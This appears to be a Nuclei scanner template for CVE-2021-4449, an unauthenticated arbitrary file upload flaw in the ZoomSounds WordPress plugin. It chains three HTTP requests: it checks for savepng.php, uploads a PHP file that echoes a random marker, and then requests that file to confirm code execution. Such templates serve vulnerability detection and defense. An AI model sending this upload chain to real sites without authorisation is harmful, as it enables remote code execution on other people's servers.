id: CVE-2021-4449-final

info:
  name: ZoomSounds Plugin - Unauthenticated Arbitrary File Upload
  author: pdteam
  severity: critical
  description: ZoomSounds plugin for WordPress contains a file upload vulnerability in savepng.php
  reference:
    - https://wpscan.com/vulnerability/07259a61-8ba9-4dd0-8d52-cc1df389c0ad
  tags: wordpress,zoomsounds,file-upload,unauth,rce

variables:
  rand_filename: "test_{{rand_base(8)}}"
  test_payload: "nuclei_{{rand_base(12)}}"

flow: http(1) && http(2) && http(3)

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/dzs-zoomsounds/savepng.php"
    
    matchers:
      - type: status
        status:
          - 200

  - method: POST
    path:
      - "{{BaseURL}}/wp-content/plugins/dzs-zoomsounds/savepng.php?location={{rand_filename}}.php"

    body: |
      <?php echo "{{test_payload}}"; ?>

    headers:
      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
      X-Requested-With: "XMLHttpRequest"
      Accept-Encoding: gzip, deflate
      Accept-Language: en-GB,en;q=0.5
      Accept: application/json, text/javascript, */*; q=0.01

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'

  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/dzs-zoomsounds/{{rand_filename}}.php"

    matchers:
      - type: word
        part: body
        words:
          - "{{test_payload}}"